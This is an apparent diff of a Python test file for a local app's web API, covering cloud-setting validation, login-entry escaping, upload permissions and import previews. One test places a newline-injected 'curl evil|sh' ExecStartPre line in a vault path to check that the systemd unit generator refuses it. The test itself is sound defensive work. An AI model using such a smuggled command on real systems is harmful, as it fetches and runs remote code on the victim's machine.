+    r = wait_job(app)["result"]
+    assert r["error"] == "missing" and r["missing"] == ["embed", "llm"]
+
+
+def test_cloud_on_needs_provider_model_and_variable(app, home):
+    """R3-4: "on" is refused until each is filled, naming what is missing; off saves."""
+    from cortex import taint
+    full = {"cloud_processing": True, "provider": "openai", "model": "gpt-x",
+            "api_key_env": "OPENAI_API_KEY"}
+    for gone, word in (("provider", "provider"), ("model", "model"),
+                       ("api_key_env", "variable")):
+        code, js, _, _ = call(app, "POST", "/api/browse/cloud", {**full, gone: ""})
+        assert code == 400 and word in js["error"], gone
+    code, js, _, _ = call(app, "POST", "/api/browse/cloud", {**full, "provider": "custom"})
+    assert code == 400 and "Base URL" in js["error"]
+    for bad in ("PATH", "HOME", "USERPROFILE", "openai_api_key"):  # S10
+        assert call(app, "POST", "/api/browse/cloud", {**full, "api_key_env": bad})[0] == 400
+    assert "cloudllm" not in taint.config()
+    assert call(app, "POST", "/api/browse/cloud", {"cloud_processing": False})[0] == 200
+    assert call(app, "POST", "/api/browse/cloud", full)[0] == 200
+    js = (server.ASSETS / "app.js").read_text(encoding="utf-8")
+    assert "'e.g. gpt-4o-mini'" in js and "'e.g. OPENAI_API_KEY'" in js
+
+
+@pytest.mark.parametrize("systemd", [True, False])
+def test_login_entry_refuses_newlines_and_escapes_dollar(monkeypatch, home, systemd):
+    """r1 S5: a vault path cannot add a line to the unit or the .desktop entry; `$` is
+    literal in the systemd unit ($$)."""
+    import sys
+    from pathlib import PurePosixPath
+    monkeypatch.setattr(sys, "platform", "linux")
+    monkeypatch.setattr(status, "_systemd", lambda: systemd)
+    bad = PurePosixPath("/home/u/vault\nExecStartPre=/bin/sh -c 'curl evil|sh'\n#")
+    with pytest.raises(ValueError):
+        status.login_text(bad)
+    assert "ExecStartPre" not in status.login_shown(bad)  # the page shows the refusal
+    text = status.login_text(PurePosixPath("/home/u/${HOME} $x"))
+    assert ('"/home/u/$${HOME} $$x"' if systemd else '"/home/u/\\\\${HOME} \\\\$x"') in text
+    monkeypatch.setattr(sys, "platform", "darwin")
+    with pytest.raises(ValueError):
+        status.login_text(PurePosixPath("/Users/u/v\x00"))
+
+
+def test_uploads_are_private_and_old_ones_swept_at_start(app, home):
+    """r1 S7: an upload is 0600 (POSIX), and a start removes uploads a killed app left."""
+    import os
+    import sys
+    _, up = upload(app, b"[]", "a.json")
+    p = app.uploads[up["upload"]]
+    if sys.platform != "win32":
+        assert p.stat().st_mode & 0o777 == 0o600
+    old = actions.tmp_dir() / "upload-0123456789abcdef.zip"
+    old.write_bytes(b"x")
+    os.utime(old, (time.time() - 2 * 86400,) * 2)
+    srv, _ = server.make_server(None)
+    srv.server_close()
+    assert not old.exists() and p.exists()
+
+
+def test_a_vault_error_in_a_job_shows_its_message(app):
+    """r4 F4: VaultError text is written for users; other errors stay type-only."""
+    from cortex.vault import VaultError
+
+    def boom(job):
+        raise VaultError("invalid_argument", "Found no .ics calendar in x.zip.")
+    app.jobs.start("Boom", "setup", boom, quiet_errors=True)
+    assert wait_job(app)["error"] == "Found no .ics calendar in x.zip."
+
+
+def test_status_has_an_ai_apps_row(app):
+    """R3-10: Status says whether any AI app is connected."""
+    _, js, _, _ = call(app, "GET", "/api/status")
+    r = next(r for r in js["rows"] if r["id"] == "apps")
+    assert r["state"] == "off" and r["action"]["go"] == "connect"
+
+
+def test_google_activity_html_says_how_many_rows_were_skipped(app, monkeypatch):
+    from cortex.browse import sources, takeout
+    monkeypatch.setattr(sources, "discover", lambda *a, **k: [])
+    path = EXPORTS / "takeout_html" / "Takeout" / "My Activity" / "Search" / "MyActivity.html"
+    call(app, "POST", "/api/import/preview", {"source": "google-activity", "path": str(path)})
+    line = wait_job(app)["result"]["lines"][0]
+    assert line.endswith("Search 1. 1 row skipped (unreadable date).")
+    monkeypatch.setattr(takeout, "records", lambda p: takeout.Rows())
+    call(app, "POST", "/api/import/preview", {"source": "google-activity", "path": str(path)})
+    err = wait_job(app)["error"]
+    assert "only English Takeouts are read" in err and "JSON" not in err
